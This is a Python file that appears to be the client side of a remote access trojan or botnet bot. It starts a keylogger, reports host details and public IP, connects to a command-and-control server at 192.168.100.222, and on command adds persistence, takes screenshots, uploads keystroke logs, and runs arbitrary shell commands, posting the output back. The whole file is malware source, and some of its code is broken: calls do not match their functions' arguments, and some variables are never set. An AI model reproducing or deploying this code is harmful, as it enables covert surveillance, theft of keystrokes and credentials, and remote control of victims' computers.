import socketio, platform, requests, os, socket, subprocess, threading, persistence
import screenshot as ImageGrab
from requests import post, get
from keylogger import start_keylogger

info = {}
sio = socketio.Client()
communication = {}

info['COMMAND'] = 'INFO'
info["hostname"] = socket.gethostname()
info["OS"] = platform.platform()
info["IP"] = get('https://api.ipify.org').text

x = threading.Thread(target=start_keylogger)
x.start()

screenshotNumber = 1
keyloggerNumber = 1

def execute_command(bot_id, command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8') if output else ""
        error_str = error.decode('utf-8') if error else ""
        if error_str:
            result = f"Error: {error_str}"
        else:
            result = f"Output: {output_str}"
        send_output(result)
    except Exception as e:
        print(f"Error: {str(e)}")

def send_output(output):
    data = {"output": output}
    try:
        response = requests.post("http://192.168.100.222/commands", json=data)
        if response.status_code == 200:
            print("Output sent successfully.")
        else:
            print("Failed to send output. Status code:", response.status_code)
    except Exception as e:
        print("Error:", e)

@sio.event
def connect():
    info['sid'] = sio.sid
    sio.send(info)
    print('SUCCESSFUL CONNECTION ESTABLISHED')

@sio.event
def message(data):
    idNum = data['idNum']
    data = data['newTask']

    global communication
    communication['COMMAND'] = 'OUTPUT'
    communication['hostname'] = info['hostname']
    communication['commandSent'] = data
    communication['idNum'] = idNum

    try:
        if len(data) > 0:
            if 'persistence' in data:
                if not persistenceVariable:
                    if persistence.try_persistence():
                        persistenceVariable = True
                        communication['PV'] = persistenceVariable
                        communication['DATA'] = 'Result: Success'
                        sio.send(communication)
                else:
                    communication['PV'] = persistenceVariable
                    communication['DATA'] = 'Result: Failure'
                    sio.send(communication)

            if 'screenshot' in data:
                try:
                    global screenshotNumber
                    filename = f"screenshot_{screenshotNumber}.png"
                    screenshot_path = os.path.join(r'./static/receivedData/screenshots', filename)
                    im = ImageGrab.grab()
                    im.save(screenshot_path)
                    with open(screenshot_path, 'rb') as f:
                        communication['DATA'] = f.read()
                        sio.send(communication)
                    screenshotNumber += 1
                except Exception as e:
                    print('Error taking Screenshot' + str(e))
                    communication['DATA'] = 'Error taking Screenshot'
                    sio.send(communication)

            if 'keylogger' in data:
                try:
                    global keyloggerNumber
                    filename = f"keylogs_{keyloggerNumber}.txt"
                    with open(os.path.join(r'./static/receivedData/keylogs', filename), 'r') as f:
                        keylogger_data = f.read()
                        communication['DATA'] = keylogger_data
                        sio.send(communication)
                    keyloggerNumber += 1
                except Exception as e:
                    print(str(e))
                    communication['DATA'] = 'Error getting keylog Data.'
                    sio.send(communication)

            if 'cmd' in data:
                data = data.replace('cmd ', '')
                execute_command(data)

    except Exception as e:
        print("Error: " + str(e))

@sio.event
def disconnect():
    print('disconnected from server')
    sio.send({'COMMAND': 'OUTPUT', 'idNum': info['idNum'], 'commandSent': 'status update', 'DATA': 'Bot is dead'})

print("Connecting to server...")
sio.connect('http://192.168.100.222:5000')
sio.wait()
